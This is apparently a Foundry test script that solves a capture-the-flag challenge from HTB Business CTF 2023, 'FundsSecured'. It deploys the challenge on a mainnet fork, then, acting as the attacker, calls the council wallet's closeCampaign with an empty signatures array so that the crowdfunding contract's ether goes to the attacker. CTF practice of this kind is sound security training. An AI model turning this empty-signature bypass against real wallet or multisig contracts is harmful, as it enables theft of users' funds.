// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/HTB_BusinessCTF_2023/FundsSecured/Setup.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    SetupFS setup;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);

        vm.deal(deployer, 1100 ether);
        setup = new SetupFS{value: 1100 ether}();

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit1() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", setup.isSolved());
        
        vm.stopPrank();
    }

    function solve() public {
        Crowdfunding cf = setup.TARGET();
        CouncilWallet wallet = setup.WALLET();
        bytes[] memory signatures = new bytes[](0);
        wallet.closeCampaign(signatures, attacker, payable(address(cf)));
    }

}


